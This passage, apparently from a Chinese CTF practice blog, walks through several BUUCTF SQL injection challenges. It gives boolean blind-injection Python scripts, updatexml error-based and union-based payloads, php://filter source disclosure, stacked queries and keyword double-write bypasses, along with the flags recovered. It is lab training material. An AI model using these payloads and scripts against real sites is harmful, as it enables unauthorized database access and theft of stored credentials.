+<p>参考：<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-Hack-world">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-Hack-world</a></p>
+<p>考察：bool盲注</p>
+<p>看到payload想骂脏话</p>
+<p>尝试常规输入，1和2可以，之后都不行</p>
+<p>尝试常规的注入，只有单引号时会返回bool(false)，应该提示bool型盲注吧</p>
+<p>payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr((select(flag)from(flag)),1,1))&#x3D;ascii(&#39;f&#39;),1,2)</span><br></pre></td></tr></table></figure>
+<p>由于1和2输出不同，根据这个进行注入即可</p>
+<p><strong>可以通过一个字典，观察哪些字符被waf过滤</strong></p>
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://a9e8a73f-f3d4-4ee4-a165-78c21730f40d.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">text1 = <span class="string">&quot;Hello, glzjin wants a girlfriend.&quot;</span></span><br><span class="line">text2 = <span class="string">&quot;Do you want to be my girlfriend?&quot;</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">	<span class="comment"># print(&quot;debug&quot;)</span></span><br><span class="line">	flag = <span class="literal">False</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">		c = <span class="built_in">chr</span>(j)</span><br><span class="line">		<span class="comment"># print(c)</span></span><br><span class="line">		s = <span class="string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,2)&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>, j) <span class="comment">#注意此处必须转成ascii码判断，因为sql中不区分大小写，直接判断字符会有双引号单引号大小写等问题</span></span><br><span class="line">		post_data = &#123;</span><br><span class="line">			<span class="string">&quot;id&quot;</span>: s</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment"># print(s)</span></span><br><span class="line">		response = requests.post(url, post_data)</span><br><span class="line">		<span class="keyword">if</span> text1 <span class="keyword">in</span> response.text:</span><br><span class="line">			flag = <span class="literal">True</span></span><br><span class="line">			ans += c</span><br><span class="line">			print(c)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> flag == <span class="literal">False</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">print(ans)</span><br><span class="line"></span><br><span class="line"><span class="comment"># if(substr(select(flag)from(flag),&#123;&#125;,1)=&#123;&#125;,1,2)</span></span><br></pre></td></tr></table></figure>
+<p>这个脚本比较慢，提高效率的方法有两个。一个是转换成ascii码查找（本题过滤了ord，因此只能用ascii进行转码），一个是range下限设置为32（’a’从32开始）</p>
+<p>wp提供了一个二分脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;a9475c38-821c-4b23-aa96-87730f0863fe.node3.buuoj.cn&#x2F;index.php&#39;</span><br><span class="line">flag &#x3D; &#39;Hello, glzjin wants a girlfriend.&#39;</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    sleep(1)</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    low &#x3D; 32</span><br><span class="line">    mid &#x3D; (high + low) &#x2F;&#x2F; 2</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        payload &#x3D; &quot;if(ascii(substr((select(flag)from(flag)),&#123;index&#125;,1))&gt;&#123;char&#125;,1,2)&quot;.format(index&#x3D;i, char&#x3D;mid)</span><br><span class="line">        data &#x3D; &#123;&#39;id&#39;: payload&#125;</span><br><span class="line">        response &#x3D; requests.post(url&#x3D;url, data&#x3D;data)</span><br><span class="line">        if flag in response.text:</span><br><span class="line">            low &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line">        mid &#x3D; (high + low) &#x2F;&#x2F; 2</span><br><span class="line"></span><br><span class="line">    result +&#x3D; chr(mid)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+<h1 id="CyberPunk"><a href="#CyberPunk" class="headerlink" title="CyberPunk"></a>CyberPunk</h1><p>题目来源：[CISCN2019 华北赛区 Day1 Web5]</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk">https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk</a></p>
+<p>考察：php伪协议，xpath报错注入，load_file</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12318551.html">https://www.cnblogs.com/wangtanzhi/p/12318551.html</a></p>
+<p><strong>第一步</strong></p>
+<p>首先进入页面，index界面可以用get的方式提交file参数，即可使用php伪协议直接读取源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
+<p><strong>第二步</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   &#x2F;&#x2F;index.php</span><br><span class="line"></span><br><span class="line">ini_set(&#39;open_basedir&#39;, &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; $file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">$file &#x3D; (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);</span><br><span class="line">if (isset($file))&#123;</span><br><span class="line">    if (preg_match(&quot;&#x2F;phar|zip|bzip2|zlib|data|input|%00&#x2F;i&quot;,$file)) &#123;</span><br><span class="line">        echo(&#39;no way!&#39;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    @include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!--?file&#x3D;?--&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  &#x2F;&#x2F;change.php</span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address &#x3D; addslashes($_POST[&quot;address&quot;]);</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;];</span><br><span class="line">        $result &#x3D; $db-&gt;query($sql);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;è®¢åä</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  &#x2F;&#x2F;search.php</span><br><span class="line">require_once &quot;config.php&quot;; </span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class="line">        if(!$row) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;&lt;p&gt;å§å:&quot;.$row[&#39;user_name&#39;].&quot;&lt;&#x2F;p&gt;&lt;p&gt;, çµè¯:&quot;.$row[&#39;phone&#39;].&quot;&lt;&#x2F;p&gt;&lt;p&gt;, å°å:&quot;.$row[&#39;address&#39;].&quot;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; &quot;æªæ¾å°è®¢å!&quot;;</span><br></pre></td></tr></table></figure>
+<p>发现在3个php中，都对user_name和pattern进行了过滤，因此只能在address上进行注入。</p>
+<p>又注意到，只在change.php中对address执行了sql语句，而在search.php中，只是从数据库中返回了address的值。故这是一个二次注入，故操作在index.php和change.php中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;数据库</span><br><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(database(),1,20)),0x7e),1)#</span><br><span class="line">&#x2F;&#x2F;表名</span><br><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(table_name,1,20)from information_schema.tables where table_schema&#x3D;&#39;ctfusers&#39;),0x7e),1)#</span><br><span class="line">&#x2F;&#x2F;字段</span><br><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(group_concat(column_name),1,20)from information_schema.columns where table_name&#x3D;&#39;user&#39;),0x7e),1)#</span><br><span class="line">&#x2F;&#x2F;数据</span><br><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)#</span><br><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),20,50)),0x7e),1)#</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;05e89701-1f01-4719-965c-3d59d7e0f664&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="xpath报错注入"><a href="#xpath报错注入" class="headerlink" title="xpath报错注入"></a>xpath报错注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,SUBSTR((SELECT f14g from f14g LIMIT 0,1),1,24),0x7e),1) # 最多显示32位，需要配合substr使用</span><br></pre></td></tr></table></figure>
+<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php # 以base64方式读取指定页面源码</span><br></pre></td></tr></table></figure>
+<h1 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h1><p>来源：SUCTF2019</p>
+<p>考察：堆叠注入，sql_mode</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://baynk.blog.csdn.net/article/details/105241226%EF%BC%8Chttps://my.oschina.net/u/4413091/blog/3384385">https://baynk.blog.csdn.net/article/details/105241226，https://my.oschina.net/u/4413091/blog/3384385</a></p>
+<p><strong>第一步</strong></p>
+<p>先用fuzz字典进行测试，发现大部分关键字被过滤（select，and，双引号等）</p>
+<p>但是分号;没过滤</p>
+<p><strong>第二步</strong></p>
+<p>然后进行下面尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;show databases;</span><br><span class="line">1; show tables;</span><br></pre></td></tr></table></figure>
+<p>均可获得答案，且知道当前table为flag</p>
+<p>但是尝试以下语句时失败，因为flag和from被过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1; show flag from flag;</span><br></pre></td></tr></table></figure>
+<p><strong>第三步</strong></p>
+<p>但是考虑到提交1时，是由返回结果的，猜测后台语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_POST[&#39;query&#39;] | xxx from flag; # xxx就是[0] &#x3D;&gt; 1，因为不论提交什么数字都得到同一个答案</span><br></pre></td></tr></table></figure>
+<p>要绕过这个语句有两种方法</p>
+<p><strong>payload1</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,1|2 from flag</span><br></pre></td></tr></table></figure>
+<p>即提交</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>
+<p><strong>payload2</strong></p>
+<p>修改sql_mode，使||被视为连接符，而不是逻辑或</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>
+<p><strong>第四步</strong></p>
+<p>得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e8aa1999-1dbc-4b3f-86d9-b961ff44cf09&#125; </span><br></pre></td></tr></table></figure>
+<h2 id="sql-mode"><a href="#sql-mode" class="headerlink" title="sql_mode"></a>sql_mode</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">参考 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;piperck&#x2F;p&#x2F;9835695.html</span><br><span class="line"></span><br><span class="line">查看当前连接会话的sql模式：</span><br><span class="line">mysql&gt; select @@session.sql_mode;</span><br><span class="line">或者从环境变量里取</span><br><span class="line">mysql&gt; show variables like &quot;sql_mode&quot;;</span><br><span class="line"></span><br><span class="line">查看全局sql_mode设置：</span><br><span class="line">mysql&gt; select @@global.sql_mode;</span><br><span class="line"></span><br><span class="line">只设置global，需要重新连接进来才会生效</span><br><span class="line"></span><br><span class="line">设置形式如</span><br><span class="line">mysql&gt; set sql_mode&#x3D;&#39;&#39;;</span><br><span class="line">mysql&gt; set global sql_mode&#x3D;&#39;NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES&#39;;</span><br></pre></td></tr></table></figure>
+<p>知道就好，具体的sql_mode太多</p>
+<h1 id="EasySQL-1"><a href="#EasySQL-1" class="headerlink" title="EasySQL"></a>EasySQL</h1><p>题目来源：极客大挑战2019</p>
+<p>考察：万能密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#39; or 1&#x3D;1#</span><br><span class="line">password: 1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2d7e92c3-eed8-407e-9763-0a66581f2030&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h1><p>来源：极客大挑战2019</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/vanarrow/article/details/107991185">https://blog.csdn.net/vanarrow/article/details/107991185</a></p>
+<p>考察：报错注入</p>
+<p><strong>错误尝试</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#39; or 1&#x3D;1#</span><br><span class="line">password: 1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello admin！</span><br><span class="line"></span><br><span class="line">Your password is &#39;c2f1e24e0e83d0373e5bbe94c3168506&#39;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&amp;password&#x3D;c2f1e24e0e83d0373e5bbe94c3168506&#39; and &#39;1&#39;&#x3D;&#39;1   #Login Success</span><br></pre></td></tr></table></figure>
+<p>均失败</p>
+<p>根据wp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39;#&amp;password&#x3D;1 # 提示input your name and password，说明语句大概为 select xxx from database where username&#x3D;&#39;$_GET[username]&#39; and password&#x3D;&#39;$_GET[password]&#39;</span><br><span class="line">?username&#x3D;1&amp;password&#x3D;12&#39; or &#39;1&#39;&#x3D;&#39;1 # 验证上一条结论，需要从username处进行注入</span><br></pre></td></tr></table></figure>
+<p><strong>注意，这里有个坑。若直接在输入框填写#，在URL会被解释成%23。而在firefox的hackbar中填写#，是不会被识别成sql语句中的注释符的</strong></p>
+<p>此处必须在username进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin&#39; order by 4 %23&amp;password&#x3D;1 </span><br><span class="line"># 报错</span><br><span class="line"></span><br><span class="line">username&#x3D;1&#39; union select 1,2,3 %23&amp;password&#x3D;1</span><br><span class="line"># 显示2,3。因此2和3是注入位</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; union select 1,database(),2 %23&amp;password&#x3D;1</span><br><span class="line"># 显示geek，为数据库名</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;geek&#39;),2 %23&amp;password&#x3D;1</span><br><span class="line"># 显示geekuser,l0ve1ysq1</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;geekuser&#39;%23&amp;password&#x3D;1</span><br><span class="line"># 显示&#39;id,username,password&#39;</span><br><span class="line"># 查看表内容，没有flag，转而查看l0ve1ysq1</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39; %23&amp;password&#x3D;1</span><br><span class="line"># 显示&#39;id,username,password&#39;</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1 %23&amp;password&#x3D;1</span><br><span class="line"># 显示&#39;1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag&#123;8e0fc55e-8d36-4db0-a48e-7e2a57fea0c9&#125;&#39;</span><br></pre></td></tr></table></figure>
+<p>根据花括号，得到flag</p>
+<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>在Hackbar中，若以get方式提交sql语句，需要注意转码问题。比如空格为+，#为%23等</p>
+<h1 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h1><p>来源：极客大挑战2019</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#SUCTF2019-EasySQL">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#SUCTF2019-EasySQL</a></p>
+<p>考察：双写绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39; order by 1 %23&amp;password&#x3D;1</span><br><span class="line"># You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;der 1 #&#39; and password&#x3D;&#39;1&#39;&#39; at line 1</span><br><span class="line">select x,y,z from db where username&#x3D;&#39;username&#39; and password&#x3D;&#39;password&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>根据wp，可以双写绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;123&#39; ununionion seselectlect 1,database(),3%23&amp;password&#x3D;bbyy</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; uniunionon seselectlect 1,2,  group_concat(table_name) ffromrom infoorrmation_schema.tables whwhereere table_schema&#x3D;database() %23&amp;password&#x3D;123</span><br><span class="line"># 显示 b4bsql,geekuser</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; uniunionon seselectlect 1,2,  group_concat(column_name) ffromrom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39; %23&amp;password&#x3D;123</span><br><span class="line"># 显示 id,username,password</span><br><span class="line"></span><br><span class="line">?username&#x3D;1&#39; uniunionon seselectlect 1,2,  group_concat(passwoorrd) ffromrom b4bsql %23&amp;password&#x3D;123</span><br><span class="line"># 显示&#39;i_want_to_play_2077,sql_injection_is_so_fun,do_you_know_pornhub,github_is_different_from_pornhub,you_found_flag_so_stop,i_told_you_to_stop,hack_by_cl4y,flag&#123;389fb140-395f-4f93-9137-fea88d9947b5&#125;&#39;</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<h1 id="hardsql"><a href="#hardsql" class="headerlink" title="hardsql"></a>hardsql</h1><p>来源：极客大挑战2019</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12257412.html">https://www.cnblogs.com/wangtanzhi/p/12257412.html</a></p>
+<p>考察：xpath报错注入</p>
+<p><strong>自己做的部分</strong></p>
+<p>发现很多常用字会报错，因此fuzz跑了一下（此处需要一个好词典，搜集的词典有点坑爹）</p>
+<p>结果union和and、空格都被过滤</p>
+<p>空格过滤可以用以下形式执行sql语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(*)from(db)</span><br></pre></td></tr></table></figure>
+<p><strong>以下为参考部分</strong></p>
+<p>发现报错注入的updatexml没过滤，尝试</p>
